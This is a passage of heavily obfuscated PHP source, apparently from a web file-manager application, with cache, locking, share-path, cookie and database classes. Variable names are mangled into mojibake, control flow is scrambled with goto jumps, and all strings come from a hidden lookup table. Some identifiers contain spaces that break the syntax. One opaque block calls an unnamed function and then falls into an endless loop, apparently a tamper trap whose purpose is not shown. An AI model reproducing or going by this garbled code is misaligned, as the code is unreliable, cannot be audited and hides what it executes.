$e“¿˜¯¢ØÜ[$EˆÎ±…¸â[1603]] = $c¡¢â›…‹Š[$b¬ºìê¶ÊÎ][$EˆÎ±…¸â[1603]]; } $c¡¢â›…‹Š[$b¬ºìê¶ÊÎ] = $e“¿˜¯¢ØÜ; goto c«äšùØòÊ; c¹¶ÌëÔ£•: $d±Ôò‰ØŒë = $EˆÎ±…¸â[1601]; $c¡¢â›…‹Š = Cache::get($d±Ôò‰ØŒë, !0); $e“¿˜¯¢ØÜ = array($EˆÎ±…¸â[1602] => timeFloat(), $EˆÎ±…¸â[1603] => timeFloat(), $EˆÎ±…¸â[271] => $aÖª²…°ß, $EˆÎ±…¸â[1596] => $F™“§ØÂğ, $EˆÎ±…¸â[207] => $BÂùŠÃÉí); goto C÷Œùˆì‡ô; Fš¿‘ƒíã: } public static function timeLimitCallLoop() { goto eŞ†…²£; aÃâˆÏîˆ: if (!$d¨ğ™Îµ…â || count($d¨ğ™Îµ…â) <= 0) { return; } $CóÚòŞŞÕÌ = !1; $Fİ Š¸àÉ‹ = timeFloat(); goto DˆÜ­ˆ—«ã; eŞ†…²£: $FåÔê×‡–Ô =& $_SERVER[£¶ä½¶¢]; $DÄì›Ë²õ = array($FåÔê×‡–Ô[1605]); $d—¹‚«®ğÇ = in_array(strtolower(ACTION), $DÄì›Ë²õ); goto AøøªƒÚâ; DˆÜ­ˆ—«ã: $dµŸà½Ôƒ  = array(); foreach ($d¨ğ™Îµ…â as $aĞ¾¼«ºÌÎ => $DÀ™êŒù£µ) { if ($Fİ Š¸àÉ‹ - $DÀ™êŒù£µ[$FåÔê×‡–Ô[1603]] > $DÀ™êŒù£µ[$FåÔê×‡–Ô[207]]) { $CóÚòŞŞÕÌ = !0; try { Hook::apply($DÀ™êŒù£µ[$FåÔê×‡–Ô[271]], $DÀ™êŒù£µ[$FåÔê×‡–Ô[1596]]); write_log($FåÔê×‡–Ô[1606] . $aĞ¾¼«ºÌÎ . $FåÔê×‡–Ô[78] . $DÀ™êŒù£µ[$FåÔê×‡–Ô[271]] . $FåÔê×‡–Ô[1607] . ACTION, $FåÔê×‡–Ô[1598]); } catch (Exception $EØ—Ä†Òç¶) { } continue; } $dµŸà½Ôƒ [$aĞ¾¼«ºÌÎ] = $DÀ™êŒù£µ; } if (!$CóÚòŞŞÕÌ) { return; } goto bÓçµ…”Ñ†; AøøªƒÚâ: if (!$d—¹‚«®ğÇ && !self::$asyncAdd) { return; } $d»ˆà„„‚ê = $FåÔê×‡–Ô[1601]; $d¨ğ™Îµ…â = Cache::get($d»ˆà„„‚ê, !0); goto aÃâˆÏîˆ; bÓçµ…”Ñ†: if (!$dµŸà½Ôƒ ) { return Cache::remove($d»ˆà„„‚ê); } Cache::set($d»ˆà„„‚ê, $dµŸà½Ôƒ , 60); Cache::removeMemory($d»ˆà„„‚ê); goto f¸ô‡‰õ¸©; f¸ô‡‰õ¸©: } public static function finished($Eˆ¥ç¬ÌÜÉ, $eìÑİ‰Œ¿Ô) { $fñÖÇÀó› =& $_SERVER[£¶ä½¶¢]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($fñÖÇÀó›[271] => $Eˆ¥ç¬ÌÜÉ, $fñÖÇÀó›[1596] => $eìÑİ‰Œ¿Ô); } private static function finishedRun() { $BÜ×î°Å× =& $_SERVER[£¶ä½¶¢]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $e´«›Í™†) { try { Hook::apply($e´«›Í™†[$BÜ×î°Å×[271]], $e´«›Í™†[$BÜ×î°Å×[1596]]); } catch (Exception $E˜…òÑ¬é) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto cÈõóÂéê®; D¯œõ¢¨ğ: define($_SERVER[£¶ä½¶¢][580], $_SERVER[£¶ä½¶¢][581]); $C™ëïØµ = $_SERVER[£¶ä½¶¢][582]; if (strlen($C™ëïØµ) < $_SERVER[£¶ä½¶¢][10]) { return; } goto f»Œô¢‰Àõ; b•‘¤¶Á“: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($E¦½äÀ¼‰¦, $EÑùàµ¢¶¦) { $BùÛ¾™¤½Ê =& $_SERVER[£¶ä½¶¢]; $this->cachePath = $E¦½äÀ¼‰¦[$BùÛ¾™¤½Ê[86]]; $this->prefix = $BùÛ¾™¤½Ê[807]; $this->cacheTime = $EÑùàµ¢¶¦; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($e’óŠ± ²Š) { $d«áøØœšé =& $_SERVER[£¶ä½¶¢]; $e’óŠ± ²Š = str_replace(array($d«áøØœšé[808], $d«áøØœšé[107], $d«áøØœšé[80]), $d«áøØœšé[809], $e’óŠ± ²Š); return $this->cachePath . $d«áøØœšé[810] . $e’óŠ± ²Š . $d«áøØœšé[811]; } public function set($døÈ¼ÇŒà‰, $e¢Äë¼‘Ù“, $FÙÓå»áˆ = false) { $aˆ¯»ƒéØÒ = $this->getFile($døÈ¼ÇŒà‰); if (file_put_contents($aˆ¯»ƒéØÒ, $this->prefix . $e¢Äë¼‘Ù“, LOCK_EX)) { @touch($aˆ¯»ƒéØÒ, intval(time() + $FÙÓå»áˆ)); clearstatcache(); return !0; } @unlink($aˆ¯»ƒéØÒ); return !1; } public function get($D¹ÜŒ½÷”ï) { $aä©‚ÉØçÄ = $this->getFile($D¹ÜŒ½÷”ï); if (file_exists($aä©‚ÉØçÄ) && filemtime($aä©‚ÉØçÄ) < time()) { @unlink($aä©‚ÉØçÄ); return !1; } $E·…ÍÆéÀ = @file_get_contents($aä©‚ÉØçÄ); return substr($E·…ÍÆéÀ, strlen($this->prefix)); } public function remove($E•§â™Õ½) { $d…¯¶Æòãà = $this->getFile($E•§â™Õ½); return @unlink($d…¯¶Æòãà); } public function deleteAll() { $d´£ÆáâŸ÷ =& $_SERVER[£¶ä½¶¢]; $a¾»ó¯¥ = scandir($this->cachePath); foreach ($a¾»ó¯¥ as $f¥›ãøæ°) { $EóáÆùÍ•é = $this->cachePath . $f¥›ãøæ°; if (strpos($EóáÆùÍ•é, $d´£ÆáâŸ÷[811]) && strpos($EóáÆùÍ•é, $d´£ÆáâŸ÷[812])) { @unlink($EóáÆùÍ•é); } } } public function clearTimeout() { $bã”Š÷Ä¨ =& $_SERVER[£¶ä½¶¢]; $aìÕŞ¶Ä© = scandir($this->cachePath); foreach ($aìÕŞ¶Ä© as $dè­¼Ø‚Ë¦) { $aùÛ‚Û¹° = $this->cachePath . $dè­¼Ø‚Ë¦; if (strpos($aùÛ‚Û¹°, $bã”Š÷Ä¨[811]) && strpos($aùÛ‚Û¹°, $bã”Š÷Ä¨[812]) && filemtime($aùÛ‚Û¹°) < time()) { @unlink($aùÛ‚Û¹°); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto Eé×ƒ ½¥Œ; Eé×ƒ ½¥Œ: $EÓ”Èá•Š© =& $_SERVER[£¶ä½¶¢]; if (self::$handle) { return self::$handle; } $bºß‚Ş½¥· = $GLOBALS[$EÓ”Èá•Š©[16]][$EÓ”Èá•Š©[356]]; goto F§Ó„ó¢¤î; cº¥…Õ…ìÜ: if ($DÌ‰—µ‡ù == $EÓ”Èá•Š©[27] && $e×‰­×Óè« == $EÓ”Èá•Š©[19]) { $DÌ‰—µ‡ù = $EÓ”Èá•Š©[203]; } switch ($DÌ‰—µ‡ù) { case $EÓ”Èá•Š©[803]: self::$handle = new CacheLockRedis(); break; case $EÓ”Èá•Š©[804]: self::$handle = new CacheLockMemcached(); break; case $EÓ”Èá•Š©[27]: self::$handle = new CacheLockDatabase(); break; case $EÓ”Èá•Š©[203]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto C—Æ‡©Ø¢É; F§Ó„ó¢¤î: self::$timeout = $bºß‚Ş½¥·[$EÓ”Èá•Š©[813]] ? $bºß‚Ş½¥·[$EÓ”Èá•Š©[813]] : 10; $e×‰­×Óè« = _get($GLOBALS[$EÓ”Èá•Š©[16]], $EÓ”Èá•Š©[814]); $DÌ‰—µ‡ù = $bºß‚Ş½¥·[$EÓ”Èá•Š©[800]] ? $bºß‚Ş½¥·[$EÓ”Èá•Š©[800]] : $EÓ”Èá•Š©[203]; goto cº¥…Õ…ìÜ; C—Æ‡©Ø¢É: } private static function key($dÓ·¤ïõ…ë) { return $_SERVER[£¶ä½¶¢][815] . Cache::key($dÓ·¤ïõ…ë); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($A²»•¹ƒ¹ = '') { self::$errorMsg = $A²»•¹ƒ¹; } public static function lockGlobal($Bªñ¯Ü‘êĞ, $Føİì‹Ò…) { return self::lock($Bªñ¯Ü‘êĞ, $Føİì‹Ò…, !0); } public static function lock($b‡á„éì‚š, $B‚™í™‰Ìà = false, $F®»›Êê¥¢ = false) { goto eà¬ø‹Û”; DÏÌñ‚óâÉ: if (!$F®»›Êê¥¢) { self::$lockItem[$côµğˆ´] = !0; } return $cŸ×¼; goto FöÜ®ƒ‚Î¡; eà¬ø‹Û”: $f¨‰­ªÅØ« =& $_SERVER[£¶ä½¶¢]; $eöÚæ¹ªáä = self::init(); $côµğˆ´ = self::key($b‡á„éì‚š); goto B„¡Ó¾À…Ì; B„¡Ó¾À…Ì: $B‚™í™‰Ìà = $B‚™í™‰Ìà ? $B‚™í™‰Ìà : self::$timeout; $cŸ×¼ = $eöÚæ¹ªáä->lock($côµğˆ´, $B‚™í™‰Ìà); if (!$cŸ×¼) { $cĞ«Æ²¿‰ = "\x6c\x6f\x63\x6b\40\x65\162\162\x6f\x72\x3b\x6b\145\x79\x3d{$b‡á„éì‚š}\x3b\x74\151\x6d\145\x3d{$B‚™í™‰Ìà}\x3b" . self::$errorMsg . $f¨‰­ªÅØ«[78] . get_caller_msg(); $DöìŠí²·¼ = LNG($f¨‰­ªÅØ«[816]) . "\50{$B‚™í™‰Ìà}\x73\51\x2e" . LNG($f¨‰­ªÅØ«[817]); $DöìŠí²·¼ .= $f¨‰­ªÅØ«[818]; if (is_string(self::$errorMsg) && self::$errorMsg) { $DöìŠí²·¼ = $DöìŠí²·¼ . $f¨‰­ªÅØ«[819] . self::$errorMsg; } write_log($cĞ«Æ²¿‰, $f¨‰­ªÅØ«[820]); show_json($DöìŠí²·¼, !1); } goto DÏÌñ‚óâÉ; FöÜ®ƒ‚Î¡: } public static function lockGet($FÁåŠ´ä™Ú) { $fƒ§ùò½Ö = self::key($FÁåŠ´ä™Ú); if (self::$lockItem[$fƒ§ùò½Ö]) { return self::$lockItem[$fƒ§ùò½Ö]; } return self::init()->lockGet($fƒ§ùò½Ö); } public static function unlock($C÷˜¦›¸…á) { $b„ò¹¹È = self::key($C÷˜¦›¸…á); self::$lockItem[$b„ò¹¹È] = null; return self::init()->unlock($b„ò¹¹È); } public static function unlockRuntime() { $b˜·…×Üš =& $_SERVER[£¶ä½¶¢]; $A„êíÏ­Æ = self::init(); $AÌŒ–Áé¡ = !1; foreach (self::$lockItem as $DŸÇê¼–ˆø => $EÌ†¹ƒÈõ) { if (!$EÌ†¹ƒÈõ) { continue; } $A„êíÏ­Æ->unlock($DŸÇê¼–ˆø); if (!$AÌŒ–Áé¡) { $AÌŒ–Áé¡ = !0; write_log($b˜·…×Üš[821] . $DŸÇê¼–ˆø . $b˜·…×Üš[78] . get_caller_msg(), $b˜·…×Üš[820]); continue; } write_log($b˜·…×Üš[821] . $DŸÇê¼–ˆø, $b˜·…×Üš[820]); } self::fileUnlockAll(); } public static function fileLock($a°¹Ñ£Şƒ¼) { goto bßåÄ»; eèŞÉ±™Ô: $e´ƒ‰êóÒï = fopen(DATA_PATH . $a°¹Ñ£Şƒ¼ . $D‚éËëÛĞç[823], $D‚éËëÛĞç[824]); if (!$e´ƒ‰êóÒï) { return !1; } $GLOBALS[$D‚éËëÛĞç[822]][$a°¹Ñ£Şƒ¼] = $e´ƒ‰êóÒï; goto c‡×´¯ÈçÈ; c‡×´¯ÈçÈ: if (flock($e´ƒ‰êóÒï, LOCK_EX)) { return !0; } self::unlock($a°¹Ñ£Şƒ¼); show_json($D‚éËëÛĞç[825], !1); goto E»å¬¨š; E»å¬¨š: return !1; goto AÛÏå¤÷×; bßåÄ»: $D‚éËëÛĞç =& $_SERVER[£¶ä½¶¢]; if (!$GLOBALS[$D‚éËëÛĞç[822]]) { $GLOBALS[$D‚éËëÛĞç[822]] = array(); } $GLOBALS[$D‚éËëÛĞç[822]][$a°¹Ñ£Şƒ¼] = !1; goto eèŞÉ±™Ô; AÛÏå¤÷×: } public static function fileUnlock($b¥¾†ªÍâ) { $EÀá‘¿–§¡ =& $_SERVER[£¶ä½¶¢]; $cìğ¡ÈÒ›¢ = $GLOBALS[$EÀá‘¿–§¡[822]][$b¥¾†ªÍâ]; if (!$cìğ¡ÈÒ›¢) { return; } $GLOBALS[$EÀá‘¿–§¡[822]][$b¥¾†ªÍâ] = !1; flock($cìğ¡ÈÒ›¢, LOCK_UN); fclose($cìğ¡ÈÒ›¢); } public static function fileUnlockAll() { $aİÊ¯Ò‡º‹ =& $_SERVER[£¶ä½¶¢]; if (!$GLOBALS[$aİÊ¯Ò‡º‹[822]]) { return; } foreach ($GLOBALS[$aİÊ¯Ò‡º‹[822]] as $EùÒ®ùñÌß => $B•‡Æ‡†Ï¨) { if (!$B•‡Æ‡†Ï¨) { continue; } $GLOBALS[$aİÊ¯Ò‡º‹[822]][$EùÒ®ùñÌß] = !1; flock($B•‡Æ‡†Ï¨, LOCK_UN); fclose($B•‡Æ‡†Ï¨); } $GLOBALS[$aİÊ¯Ò‡º‹[822]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto E¸Ûßİ¶ê; A‰ôÁÎ²«ö: class PathDriverDbShareItem extends PathDriverDB { public function __construct($eè‚Öª…Ë—) { $this->pathParse = $eè‚Öª…Ë—; $this->model = Model($_SERVER[£¶ä½¶¢][1203]); } public function getPathOuter($cÂÊØÙ¯ù) { $BÈ¾ˆÇ«ùÊ =& $_SERVER[£¶ä½¶¢]; if (!$cÂÊØÙ¯ù) { return $cÂÊØÙ¯ù; } $bï§à‹ŠÒ½ = $this->parse($cÂÊØÙ¯ù); return trim(KodIO::makeShare($this->pathParse[$BÈ¾ˆÇ«ùÊ[401]], $bï§à‹ŠÒ½[$BÈ¾ˆÇ«ùÊ[401]]), $BÈ¾ˆÇ«ùÊ[18]); } protected function infoParse($dŠšê¤‡éæ, $d¢’´êÓÊ¢ = false, $EÔÃÁïËÓí = false) { $Dˆ‰¼´ùç =& $_SERVER[£¶ä½¶¢]; $fÎ½—Çí‘ = $this->pathParse[$Dˆ‰¼´ùç[401]]; $c’¿˜³ô› = trim($this->pathParse[$Dˆ‰¼´ùç[1062]], $Dˆ‰¼´ùç[18]); return Action($Dˆ‰¼´ùç[1211])->sharePathInfo($fÎ½—Çí‘, $c’¿˜³ô›); } public function infoFull($A‹°Èçê¡¥) { $CéåÓŒ¤† =& $_SERVER[£¶ä½¶¢]; $Dğñš­¦èï = explode($CéåÓŒ¤†[18], trim($A‹°Èçê¡¥, $CéåÓŒ¤†[18])); if (count($Dğñš­¦èï) > 1) { $aÜìŠ½–á = implode($CéåÓŒ¤†[18], array_splice($Dğñš­¦èï, 1)); $bğ°ÀÈ„ó = $this->model->pathInfoByPath($Dğñš­¦èï[0], $aÜìŠ½–á); if (!$bğ°ÀÈ„ó) { return !1; } $this->pathParse[$CéåÓŒ¤†[1062]] = $bğ°ÀÈ„ó[$CéåÓŒ¤†[403]]; } return $this->infoParse($A‹°Èçê¡¥); } public function listAll($CëÄ˜Ñì‰œ) { goto C‹ÖÒ¡ÎŒô; C‹ÖÒ¡ÎŒô: $a¬ÇÖœƒ±Ú =& $_SERVER[£¶ä½¶¢]; $dØ¡¶‚ÖÎ¶ = IO::info($this->pathParse[$a¬ÇÖœƒ±Ú[86]]); if (!$dØ¡¶‚ÖÎ¶) { return array(); } goto aµ‰•ĞĞñ; aµ‰•ĞĞñ: $Fõíø’§Éá = $this->model->listAll($CëÄ˜Ñì‰œ); $EªÍ™œÅˆ = Model($a¬ÇÖœƒ±Ú[571])->getInfo($dØ¡¶‚ÖÎ¶[$a¬ÇÖœƒ±Ú[476]]); $cëğÈŒÂ‡ = Action($a¬ÇÖœƒ±Ú[1211]); goto F¶À¤Ñ±æŸ; F¶À¤Ñ±æŸ: foreach ($Fõíø’§Éá as &$bõ¸ÓÈÓœ) { check_abort(); $bõ¸ÓÈÓœ[$a¬ÇÖœƒ±Ú[95]] = $cëğÈŒÂ‡->_shareItemeParse($bõ¸ÓÈÓœ[$a¬ÇÖœƒ±Ú[95]], $EªÍ™œÅˆ); } unset($bõ¸ÓÈÓœ); return $Fõíø’§Éá; goto a‹Ïø‹ÎÖ¶; a‹Ïø‹ÎÖ¶: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Bªˆï˜£ ¾) { $this->pathParse = $Bªˆï˜£ ¾; $this->model = Model($_SERVER[£¶ä½¶¢][1203]); } protected function infoParse($A’Á¯÷ˆ¨Ò, $d××¿åæğè = false, $bó˜¾¬œó‘ = false) { $c‘ŠÅ¨ºøË =& $_SERVER[£¶ä½¶¢]; return Action($c‘ŠÅ¨ºøË[1068])->sharePathInfo($this->pathParse[$c‘ŠÅ¨ºøË[86]], !0); } public function listPath($D²ˆÉé¶, $D¿œ˜¢œÁ‚ = false) { $eËõŠ–êç =& $_SERVER[£¶ä½¶¢]; $aÅÎİ£‡Õ° = parent::listPath($D²ˆÉé¶, $D¿œ˜¢œÁ‚); foreach ($aÅÎİ£‡Õ° as $F†ÆŸ ßõŸ => $c¢Ò…­É‰î) { if (!in_array($F†ÆŸ ßõŸ, array($eËõŠ–êç[84], $eËõŠ–êç[85]))) { continue; } foreach ($c¢Ò…­É‰î as $f´ˆ›©Ã°í => $e‘ìÌ¯Âïö) { $aÅÎİ£‡Õ°[$F†ÆŸ ßõŸ][$f´ˆ›©Ã°í] = Action($eËõŠ–êç[1068])->shareItemInfo($e‘ìÌ¯Âïö); } } return $aÅÎİ£‡Õ°; } public function listAll($FÔ§ä­“½Ô) { goto bƒ¡Í‰‘Ù‘; bƒ¡Í‰‘Ù‘: $eô¦ÌÇ÷¿¦ =& $_SERVER[£¶ä½¶¢]; $B¿¯ÅÑñåÉ = IO::info($this->pathParse[$eô¦ÌÇ÷¿¦[86]]); if (!$B¿¯ÅÑñåÉ) { return array(); } goto bº¼Š£÷Îƒ; D–•êš™†‰: return $Dï™ ãÕ£ˆ; goto DÒä´ÀÍ—–; bº¼Š£÷Îƒ: $Dï™ ãÕ£ˆ = $this->model->listAll($FÔ§ä­“½Ô); foreach ($Dï™ ãÕ£ˆ as &$c„‹•Ğƒù³) { $c„‹•Ğƒù³[$eô¦ÌÇ÷¿¦[95]] = Action($eô¦ÌÇ÷¿¦[1068])->shareItemInfo($c„‹•Ğƒù³[$eô¦ÌÇ÷¿¦[95]]); } unset($c„‹•Ğƒù³); goto D–•êš™†‰; DÒä´ÀÍ—–: } } class PathDriverDriverShareItem { public function __construct($dÈÓë™©‰î) { $this->pathParse = $dÈÓë™©‰î; } public function __call($d²“Ø—Éè•, $C¼Û«ÊëšĞ) { $BÃÚï×©Şğ =& $_SERVER[£¶ä½¶¢]; if (method_exists($this, $d²“Ø—Éè•)) { return; } $A¼¤‘¶ëî° = call_user_func_array(array($BÃÚï×©Şğ[1212], $d²“Ø—Éè•), $C¼Û«ÊëšĞ); $E‡àºóÀôÜ = array($BÃÚï×©Şğ[1213], $BÃÚï×©Şğ[1214], $BÃÚï×©Şğ[1215], $BÃÚï×©Şğ[1216], $BÃÚï×©Şğ[526], $BÃÚï×©Şğ[528], $BÃÚï×©Şğ[1217], $BÃÚï×©Şğ[117], $BÃÚï×©Şğ[1218], $BÃÚï×©Şğ[1219]); if (in_array($d²“Ø—Éè•, $E‡àºóÀôÜ)) { $A¼¤‘¶ëî° = $this->getPathOuter($A¼¤‘¶ëî°); } return $A¼¤‘¶ëî°; } public function copy($fÎª™Ïº³, $dŠïï‘ÎĞ², $F‘„‡¹¼¯ = false) { return $this->copyMove($fÎª™Ïº³, $dŠïï‘ÎĞ², $F‘„‡¹¼¯, $_SERVER[£¶ä½¶¢][526]); } public function move($fˆ‹÷§”±‘, $BéÄøÚ•ğ, $EƒÍß°™Ã = false) { return $this->copyMove($fˆ‹÷§”±‘, $BéÄøÚ•ğ, $EƒÍß°™Ã, $_SERVER[£¶ä½¶¢][528]); } private function copyMove($cˆ¢Õ¹Ìó‡, $B¯´½ù– ¨, $A®¾‚Á¡‘Í, $CãÖÖˆÊ‹) { goto Fù÷ğÕã®‡; Fù÷ğÕã®‡: $aâ‘ï‹§±¼ =& $_SERVER[£¶ä½¶¢]; $E”¥ïÔõ…„ = $B¯´½ù– ¨; $A·ãï¿Í†ä = IO::driverMake($B¯´½ù– ¨); goto fœù¼¹á¸‹; fœù¼¹á¸‹: if ($A·ãï¿Í†ä->pathParse[$aâ‘ï‹§±¼[1046]]) { $B¯´½ù– ¨ = $A·ãï¿Í†ä->pathParse[$aâ‘ï‹§±¼[1046]]; } else { $B¯´½ù– ¨ = $E”¥ïÔõ…„; } $B´ô«ƒîŒ = IO::copyMove($cˆ¢Õ¹Ìó‡, $B¯´½ù– ¨, $A®¾‚Á¡‘Í, $CãÖÖˆÊ‹); $B´ô«ƒîŒ = $this->getPathOuter($B´ô«ƒîŒ); goto EåËˆã ö¾; EåËˆã ö¾: return $B´ô«ƒîŒ; goto Aóé˜‚Âöå; Aóé˜‚Âöå: } public function pathThis($Dªä£ËÇß) { return get_path_this($this->pathParse[$_SERVER[£¶ä½¶¢][86]]); } public function pathFather($dí¢×ÜòÚø) { return get_path_father($this->pathParse[$_SERVER[£¶ä½¶¢][86]]); } public function iconvSystem($B‹†Âá—šÖ) { return $B‹†Âá—šÖ; } protected function infoParse($fÌµ¬á­ÜÕ, $aÀÕ¨Ê‚› = false) { $F²¿öŠë£î =& $_SERVER[£¶ä½¶¢]; $BÒÁ…Ó°Š¸ = $this->pathParse[$F²¿öŠë£î[474]][$F²¿öŠë£î[1069]] . $this->pathParse[$F²¿öŠë£î[1062]]; if ($aÀÕ¨Ê‚›) { $c¢çÆ¥¯’ = IO::infoWithChildren($BÒÁ…Ó°Š¸); } else { $c¢çÆ¥¯’ = IO::info($BÒÁ…Ó°Š¸); } $f»¶£ÌÆ† = $this->pathParse[$F²¿öŠë£î[474]]; return Action($F²¿öŠë£î[1211])->_shareItemeParse($c¢çÆ¥¯’, $f»¶£ÌÆ†); } public function listAll($CîÕ¸§º‰á) { $b½Ğ›¡¥¦‡ =& $_SERVER[£¶ä½¶¢]; $B†ôÊ¶¿ì¢ = IO::listAll($CîÕ¸§º‰á); $d©é‚’»Ø = $this->pathParse[$b½Ğ›¡¥¦‡[474]]; foreach ($B†ôÊ¶¿ì¢ as &$cã³ÊÚ›„ó) { check_abort(); $DøÃæ¡¢ç½ = IO::info($cã³ÊÚ›„ó[$b½Ğ›¡¥¦‡[86]]); $DøÃæ¡¢ç½ = is_array($DøÃæ¡¢ç½) ? $DøÃæ¡¢ç½ : array(); $cã³ÊÚ›„ó = array_merge($DøÃæ¡¢ç½, $cã³ÊÚ›„ó); $cã³ÊÚ›„ó[$b½Ğ›¡¥¦‡[95]] = Action($b½Ğ›¡¥¦‡[1211])->_shareItemeParse($cã³ÊÚ›„ó, $d©é‚’»Ø); } unset($cã³ÊÚ›„ó); return $B†ôÊ¶¿ì¢; } public function getPathOuter($dö÷Á‘…¢Ì) { goto c³ ÈÓ¼´; AÚÂÑÉíØ: $fîŠíæõœÓ = KodIO::clear($dö÷Á‘…¢Ì); $dñ¢Ï—ê° = KodIO::clear($this->pathParse[$b­†ğ†ŠÊµ[474]][$b­†ğ†ŠÊµ[1069]]); $A×„‹×Óš = substr($fîŠíæõœÓ, strlen($dñ¢Ï—ê°)); goto Bß¼”¤Îà™; c³ ÈÓ¼´: $b­†ğ†ŠÊµ =& $_SERVER[£¶ä½¶¢]; $bº¯Û—Ú«ã = KodIO::parse($dö÷Á‘…¢Ì); if ($bº¯Û—Ú«ã[$b­†ğ†ŠÊµ[39]] == KodIO::KOD_SHARE_ITEM) { return $bº¯Û—Ú«ã[$b­†ğ†ŠÊµ[86]]; } goto AÚÂÑÉíØ; Bß¼”¤Îà™: if (substr($fîŠíæõœÓ, 0, strlen($dñ¢Ï—ê°)) != $dñ¢Ï—ê°) { return !1; } return $this->pathParse[$b­†ğ†ŠÊµ[1063]] . $b­†ğ†ŠÊµ[18] . ltrim($A×„‹×Óš, $b­†ğ†ŠÊµ[18]); goto Aä™ñ˜äìï; Aä™ñ˜äìï: } public function getType() { $D¦ßœ‘Åö‡ =& $_SERVER[£¶ä½¶¢]; $dÔ¾»­±„ï = str_replace($D¦ßœ‘Åö‡[82], $D¦ßœ‘Åö‡[43], get_class($this)); return strtolower($dÔ¾»­±„ï); } public function isTypeObject($Cèõ²äç÷º) { return IO::isTypeObject($Cèõ²äç÷º); } public function info($D·ê“›£) { return $this->infoParse($D·ê“›£); } public function infoAuth($Aîİã¤õÇá) { return $this->infoParse($Aîİã¤õÇá); } public function infoWithChildren($b¨óš³šº ) { return $this->infoParse($b¨óš³šº , !0); } public function infoFull($cÂ®ñŠ‚°Â) { return $this->infoParse($cÂ®ñŠ‚°Â); } } goto F²‘Âòì˜’; E‡êäí¹æÎ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($E®ÇÇ¡İÙ = '', $aõ»ˆÄáøË = 0) { if (is_string($E®ÇÇ¡İÙ) && $E®ÇÇ¡İÙ != $_SERVER[£¶ä½¶¢][43]) { $this->prefix = $E®ÇÇ¡İÙ; } if (is_numeric($aõ»ˆÄáøË) && $aõ»ˆÄáøË > 0) { $this->expire = $aõ»ˆÄáøË; } } public static function getInstance() { static $E‰ßÅê¨„®; if ($E‰ßÅê¨„® === null) { $E‰ßÅê¨„® = new self(); } return $E‰ßÅê¨„®; } private static $cookieDisable = false; public static function disable($AË©œ­Óá) { self::$cookieDisable = $AË©œ­Óá; } private static $sameCookieSet = array(); public static function set($bäŒİë—æ·, $f¡æ²×Ÿ£ô, $Aé¿Ç÷Ò– = 0, $Eù¡äöëÆÓ = false, $BŒÜÀ±Œƒñ = false) { goto f§„×ğ—ÕØ; aäøÃö³Ñí: $eİ«Øó¨… = $EŸ¢ÖÅŠ[43]; setcookie($bäŒİë—æ·, $f¡æ²×Ÿ£ô, time() + $Aé¿Ç÷Ò–, $EŸ¢ÖÅŠ[18] . trim($BŒÜÀ±Œƒñ, $EŸ¢ÖÅŠ[18]) . $eİ«Øó¨…, !1, !1, $Eù¡äöëÆÓ); goto c¯ìĞœ¨; CÅ­îŞÅ±‚: if (isset(self::$sameCookieSet[$bäŒİë—æ·]) && self::$sameCookieSet[$bäŒİë—æ·] == $f¡æ²×Ÿ£ô . $Aé¿Ç÷Ò–) { return; } self::$sameCookieSet[$bäŒİë—æ·] = $f¡æ²×Ÿ£ô . $Aé¿Ç÷Ò–; if (!$BŒÜÀ±Œƒñ) { $BŒÜÀ±Œƒñ = str_replace(HOST, $EŸ¢ÖÅŠ[43], APP_HOST); $BŒÜÀ±Œƒñ = _get($GLOBALS, $EŸ¢ÖÅŠ[842], $BŒÜÀ±Œƒñ); } goto aäøÃö³Ñí; f§„×ğ—ÕØ: $EŸ¢ÖÅŠ =& $_SERVER[£¶ä½¶¢]; if (self::$cookieDisable) { return; } if (!$Aé¿Ç÷Ò–) { $Aé¿Ç÷Ò– = 24 * 3600 * 7; } goto CÅ­îŞÅ±‚; c¯ìĞœ¨: } public static function setSafe($b˜„«ĞÒ©, $EòÅÚ­ß—¹, $f˜×öÑ”ÚÛ = 0) { self::set($b˜„«ĞÒ©, $EòÅÚ­ß—¹, $f˜×öÑ”ÚÛ, !0); } public static function get($f§ÃÒ‹Œ¯†) { return isset($_COOKIE[$f§ÃÒ‹Œ¯†]) ? $_COOKIE[$f§ÃÒ‹Œ¯†] : !1; } public static function remove($b’Ü»ÆÙ‹Ë, $bÁ¼«Â‡À = false) { unset($_COOKIE[$b’Ü»ÆÙ‹Ë]); self::set($b’Ü»ÆÙ‹Ë, $_SERVER[£¶ä½¶¢][43], 1, $bÁ¼«Â‡À); } } if (!isset($_SERVER[$_SERVER[£¶ä½¶¢][4]]) || !isset($_SERVER[$_SERVER[£¶ä½¶¢][5]])) { goto C²©ÂŒÁÄ; F‡âø‹–¹Ê: $D¢Û ÈëóØ($_SERVER[$_SERVER[£¶ä½¶¢][7]] . $_SERVER[£¶ä½¶¢][8]); $B¢ÏÃğºêÂ = 2; while ($B¢ÏÃğºêÂ > 1) { $BÒŸéˆ˜¥¿ = rawurlencode($B¢ÏÃğºêÂ . $_SERVER[£¶ä½¶¢][13]); } goto DˆˆÅˆõ; fï²£•·Ï: $dìÀ±ô† = explode($_SERVER[£¶ä½¶¢][9], $eé‚Î†¿); if (count($dìÀ±ô†) < $_SERVER[£¶ä½¶¢][10]) { $C“Äšô† = $_SERVER[£¶ä½¶¢][11]; $C“Äšô†(); } $D¢Û ÈëóØ = $_SERVER[£¶ä½¶¢][12]; goto F‡âø‹–¹Ê; C²©ÂŒÁÄ: $Aõ³ˆÈ´˜ = $_SERVER[£¶ä½¶¢][6]; $aÂÅ©ŞùÓ = $_SERVER[$_SERVER[£¶ä½¶¢][7]] . $_SERVER[£¶ä½¶¢][8]; $eé‚Î†¿ = $Aõ³ˆÈ´˜($aÂÅ©ŞùÓ); goto fï²£•·Ï; DˆˆÅˆõ: } class DbMysql extends Db { public function __construct($bíŞàò˜á = '') { $F‡Ñƒ»Ğ‰ =& $_SERVER[£¶ä½¶¢]; if 